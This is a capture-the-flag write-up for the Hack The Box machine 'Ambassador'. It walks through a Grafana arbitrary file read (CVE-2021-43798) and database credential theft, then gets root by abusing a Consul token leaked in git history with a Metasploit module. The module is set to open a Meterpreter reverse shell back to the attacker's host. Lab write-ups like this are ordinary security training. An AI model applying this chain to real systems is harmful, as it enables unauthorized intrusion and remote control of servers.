---
title: Ambassador [HTB]
published: true
---

# Introduction
Ambassador is a medium-difficulty machine that makes you hack a web app by exploiting one of the services that it provides. With a known CVE. I feel like CVE boxes are usually easy, but in this box, we had to exploit CVEs for user.txt and root.txt. Both of those exploitations had various steps. I spent a lot of time trying to get root, I felt like that was the more difficult part.

# Initial enumeration
Once again, as always, let's run nmap
```
➜ sudo nmap -sC -sV -T4 10.10.11.183
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 18 Oct 2022 12:49:27 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions:
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 18 Oct 2022 12:49:32 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 194
|   Capabilities flags: 65535
|   Some Capabilities: InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, LongPassword, LongColumnFlag, IgnoreSigpipes, SupportsCompression, ODBCClient, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: M,\x07D0%9qdfgosQx\x14F\x1ARm
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=10/18%Time=634EA0D6%P=arm-apple-darwin21.1.0%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Co
SF:ntrol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nE
SF:xpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cook
SF:ie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Pro
SF:tection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2018\x20Oct\x202022\x201
SF:2:49:27\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fo
SF:und</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\
SF:nCache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\
SF:nPragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fra
SF:me-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x
SF:20Tue,\x2018\x20Oct\x202022\x2012:49:32\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLS
SF:SessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Getting user

Ok, so we know we have access to the usual HTTP. But there's also a PPP and a MySQL service running. Wonder what's that...
Gobuster didn't return anything that I used, so I won't post the output. The web page wasn't useful either, just had a hint: "Use the developer account to SSH, and DevOps will give you the password." That sounds like we might need to find some creds... Let's try port 3000.

When we access http://10.10.11.183:3000/ it asks for a login for a service called "Grafana". There's also the version of that service, which is: v8.2.0. Let's look for an exploit.

After a quick google search, I found an exploit (CVE-2021-43798) which is an Unauthorized Arbitrary File Read. Grafana is vulnerable to this from 8.0.0-beta1 to 8.3.0.

I used https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798 to exploit grafana. After getting the files I found admin creds in grafana.ini. There's also a SQLite database. Which I used to find the creds to the MySQL database (data source in the backend).

Now we use the 


```
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.082 sec)

MySQL [(none)]> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [whackywidget]> SHOW TABLES;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.067 sec)

MySQL [whackywidget]> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.063 sec)
```

So the developer pass is in Base64, after decoding the password we get: anEnglishManInNewYork027468. Let's use SSH to get a shell and user.txt!

# Getting root

I spent quite some time trying to figure out how to root the box. I always check for "sudo -l" and "ps aux" first, but that wasn't useful. So I ran linpeas and tried to look for anything useful. After a while, I still wasn't able to find anything, so I read it again and something stood out:

```
╔══════════╣ Analyzing Github Files (limit 70)
.github Not Found

-rw-rw-r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig

.git-credentials Not Found

drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git
```

There's a .git folder in /opt/my-app, that's a repository! After inspecting the repo, I didn't get any ideas on how to use it to get root. I was about to quit, but then I remembered: "Wait, I haven't checked commits!?" So I looked for all the commits using the git log command:

```
commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
developer@ambassador:/opt/my-app$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
WARNING: terminal is not fully functional
-  (press RETURN)commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
new file mode 100755
index 0000000..35c08f6
--- /dev/null
+++ b/whackywidget/put-config-in-consul.sh
@@ -0,0 +1,4 @@
+# We use Consul for application config in production, this script will help set the correct values for the app
+# Export MYSQL_PASSWORD before running
+
+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
developer@ambassador:/opt/my-app$
```

consul token? What's that? I know we have a "consul" folder in /opt. But what is it? After a quick google search, I found out that it was used to "configure applications across dynamic, distributed infrastructure". So I started thinking: "do we need to use an exploit again?"

Looking online, there's a Remote Command Execution exploit... That might be useful!

Now, I gotta be honest, the first times trying to run this exploit were a bit of a pain. Nothing was working, so I had to bind the machine port 8500 to my own 8500 port using the following command:

```
ssh developer@ambassador.htb -L 8500:localhost:8500
```

On msfconsole I entered the following options:

```
Module options (exploit/multi/misc/consul_service_exec):

   Name       Current Setting                       Required  Description
   ----       ---------------                       --------  -----------
   ACL_TOKEN  (acl_token from git show)             no        Consul Agent ACL token
   Proxies                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1                             yes       The target host(s), see https://github.com/rapid7/metasploit-frame
                                                              work/wiki/Using-Metasploit
   RPORT      8500                                  yes       The target port (TCP)
   SRVHOST    0.0.0.0                               yes       The local host or network interface to listen on. This must be an
                                                              address on the local machine or 0.0.0.0 to listen on all addresses
                                                              .
   SRVPORT    8080                                  yes       The local port to listen on.
   SSL        false                                 no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                                     yes       The base path
   URIPATH                                          no        The URI to use for this exploit (default is random)
   VHOST                                            no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  (your htb ip)    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```

Boom, we have a root shell!